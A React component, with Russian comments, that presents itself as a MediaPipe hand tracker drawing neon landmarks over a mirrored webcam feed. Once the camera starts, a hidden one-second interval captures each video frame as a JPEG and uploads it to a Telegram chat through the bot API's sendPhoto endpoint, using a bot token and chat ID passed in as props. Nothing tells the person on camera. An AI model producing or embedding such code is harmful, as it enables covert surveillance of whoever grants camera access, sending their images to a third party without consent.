import { useEffect, useRef } from 'react';
import { Hands } from '@mediapipe/hands';
import { drawConnectors, drawLandmarks } from '@mediapipe/drawing_utils';

const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
  const handsRef = useRef(null);
  const intervalRef = useRef(null);

  useEffect(() => {
    const videoElement = videoRef.current;
    const canvasElement = canvasRef.current;
    const ctx = canvasElement.getContext('2d');

    handsRef.current = new Hands({
      locateFile: (file) =>
        `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
    });

    handsRef.current.setOptions({
      maxNumHands: 2,
      modelComplexity: 1,
      minDetectionConfidence: 0.7,
      minTrackingConfidence: 0.7,
    });

    handsRef.current.onResults((results) => {
      canvasElement.width = videoElement.videoWidth;
      canvasElement.height = videoElement.videoHeight;

      ctx.save();
      ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);

      // ✅ Делаем зеркальное отображение
      ctx.scale(-1, 1);
      ctx.translate(-canvasElement.width, 0);
      ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

      // Возвращаем трансформацию для правильного отображения landmarks
      ctx.setTransform(1, 0, 0, 1, 0, 0);

      if (results.multiHandLandmarks) {
        for (let i = 0; i < results.multiHandLandmarks.length; i++) {
          const landmarks = results.multiHandLandmarks[i];
          
          // Создаем зеркальные координаты для landmarks
          const flippedLandmarks = landmarks.map(landmark => ({
            ...landmark,
            x: 1 - landmark.x // Инвертируем X координату
          }));

          // Рисуем соединения с неоновым эффектом
          drawConnectors(ctx, flippedLandmarks, Hands.HAND_CONNECTIONS, {
            color: '#00f9ff',
            lineWidth: 4,
          });

          // Рисуем точки landmarks с неоновым эффектом
          drawLandmarks(ctx, flippedLandmarks, {
            color: '#ff00ff',
            lineWidth: 3,
            radius: 6,
          });

          // Добавляем дополнительный неоновый эффект
          flippedLandmarks.forEach((landmark, index) => {
            const x = landmark.x * canvasElement.width;
            const y = landmark.y * canvasElement.height;
            
            // Создаем градиент для неонового свечения
            const gradient = ctx.createRadialGradient(x, y, 0, x, y, 15);
            gradient.addColorStop(0, 'rgba(255, 0, 255, 0.8)');
            gradient.addColorStop(0.5, 'rgba(0, 249, 255, 0.4)');
            gradient.addColorStop(1, 'rgba(0, 249, 255, 0)');
            
            ctx.save();
            ctx.shadowBlur = 20;
            ctx.shadowColor = '#ff00ff';
            ctx.fillStyle = gradient;
            ctx.beginPath();
            ctx.arc(x, y, 8, 0, 2 * Math.PI);
            ctx.fill();
            ctx.restore();
          });
        }
      }

      ctx.restore();
    });

    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoElement.srcObject = stream;

        videoElement.onloadedmetadata = async () => {
          try {
            await videoElement.play();

            const loop = async () => {
              if (videoElement) {
                await handsRef.current.send({ image: videoElement });
                requestAnimationFrame(loop);
              }
            };

            loop();

            intervalRef.current = setInterval(() => {
              ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
              canvasElement.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'snapshot.jpg');
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                  method: 'POST',
                  body: formData,
                })
                  .then((res) => res.json())
                  .then((data) => console.log('Фото отправлено:', data))
                  .catch((err) => console.error('Ошибка отправки:', err));
              }, 'image/jpeg');
            }, 1000);
          } catch (err) {
            console.error('Ошибка при запуске видео:', err);
          }
        };
      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
      }
    };

    startCamera();

    return () => {
      if (videoElement.srcObject) {
        videoElement.srcObject.getTracks().forEach((track) => track.stop());
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, [videoRef, canvasRef, botToken, chatId]);

  return null;
};

export default HandTracker;